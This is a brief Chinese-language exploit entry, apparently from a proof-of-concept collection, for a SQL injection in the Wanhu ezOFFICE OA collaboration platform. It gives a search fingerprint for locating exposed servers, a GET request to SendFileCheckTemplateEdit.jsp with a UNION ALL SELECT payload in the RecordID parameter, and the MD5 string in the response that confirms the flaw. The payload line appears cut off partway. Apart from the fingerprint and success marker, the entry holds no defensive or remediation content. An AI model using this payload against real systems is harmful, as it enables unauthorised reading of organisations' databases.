# 万户OA协同管理平台SendFileCheckTemplateEdit-SQL注入漏洞

万户OA协同管理平台SendFileCheckTemplateEdit ｜ SQL注入 ｜ —
- **指纹**：`app="万户ezOFFICE协同管理平台"`
- **请求**：`GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CN`
- **响应特征**：200 6cfe798ba8e5b85feb50164c59f4bec9